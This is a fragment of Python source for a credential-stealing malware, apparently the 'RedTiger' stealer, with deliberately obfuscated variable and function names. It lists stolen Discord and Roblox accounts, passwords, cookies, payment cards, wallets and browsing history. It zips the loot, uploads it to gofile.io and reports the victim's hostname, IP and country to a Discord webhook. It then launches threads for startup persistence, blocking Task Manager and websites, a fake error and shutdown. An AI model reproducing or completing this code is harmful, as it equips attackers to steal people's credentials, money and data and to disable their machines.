    if v4r_status_screenshot != None:
        v4r_option.append(f"Screenshot        : {v4r_status_screenshot}")

    if v4r_status_system_info != None:
        v4r_option.append(f"System Info       : {v4r_status_system_info}")

    if v4r_number_discord_account != None:
        v4r_option.append(f"Discord Accounts  : {v4r_number_discord_account}")

    if v4r_number_roblox_account != None:
        v4r_option.append(f"Roblox Accounts   : {v4r_number_roblox_account}")

    if v4r_number_passwords != None:
        v4r_option.append(f"Passwords         : {v4r_number_passwords}")

    if v4r_number_cookies != None:
        v4r_option.append(f"Cookies           : {v4r_number_cookies}")

    if v4r_number_cards != None:
        v4r_option.append(f"Cards             : {v4r_number_cards}")

    if v4r_number_history != None:
        v4r_option.append(f"Browsing History  : {v4r_number_history}")

    if v4r_number_downloads != None:
        v4r_option.append(f"Download History  : {v4r_number_downloads}")

    if v4r_number_extentions != None:
        v4r_option.append(f"Extentions        : {v4r_number_extentions}")

    if v4r_name_wallets != None:
        v4r_option.append(f"Wallets           : {v4r_name_wallets}")

    if v4r_name_game_launchers != None:
        v4r_option.append(f"Game Launchers    : {v4r_name_game_launchers}")
    
    if v4r_name_apps != None:
        v4r_option.append(f"Apps              : {v4r_name_apps}")
    
    if v4r_number_files != None:
        v4r_option.append(f"Interesting Files : {v4r_number_files}")

v4r_zip_buffer.seek(0)

try:
    try: v4r_gofileserver = loads(urlopen("https://api.gofile.io/getServer").read().decode('utf-8'))["data"]["server"]
    except: v4r_gofileserver = "store4"

    v4r_response = requests.post(
        f"https://{v4r_gofileserver}.gofile.io/uploadFile",
        files={"file": (f"RedTiger_{v4r_username_pc.replace(' ', '_')}.zip", v4r_zip_buffer)}
    )

    v4r_download_link = v4r_response.json()["data"]["downloadPage"]
except Exception as e:
    v4r_download_link = f"Error: {e}"

embed = discord.Embed(title="Victim Affected", color=v4r_color_embed
).add_field(
    inline=False,
    name="Summary of Information", 
    value=f"""```
Hostname    : {v4r_hostname_pc}
Username    : {v4r_username_pc}
DisplayName : {v4r_displayname_pc}
Ip Public   : {v4r_ip_address_public}
Ip Local    : {v4r_ip_adress_local}
Country     : {v4r_country}```"""
).add_field(
    inline=False,
    name="Stolen Information", 
    value=f"""```swift
{"\n".join(v4r_option)}```"""
).add_field(
    inline=False,
    name="Download Link", 
    value=f"""{v4r_download_link}"""
).set_footer(
    text=v4r_footer_text, 
    icon_url=v4r_avatar_embed
)

try:  
    v4r_w3bh00k = discord.SyncWebhook.from_url(v4r_w3bh00k_ur1)
    v4r_w3bh00k.send(embed=embed, username=v4r_username_embed, avatar_url=v4r_avatar_embed)
except: pass


try: threading.Thread(target=D3f_B10ckK3y).start()
except: pass
try: threading.Thread(target=D3f_B10ckT45kM4n4g3r).start()
except: pass
try: threading.Thread(target=D3f_B10ckW3b5it3).start()
except: pass
try: threading.Thread(target=D3f_St4rtup).start()
except: pass
try: threading.Thread(target=D3f_Sp4m_Opti0ns).start()
except: pass
try: threading.Thread(target=D3f_R3st4rt).start()
except: pass
try: threading.Thread(target=D3f_F4k33rr0r).start()
except: pass
try: threading.Thread(target=D3f_Shutd0wn).start()
except: pass
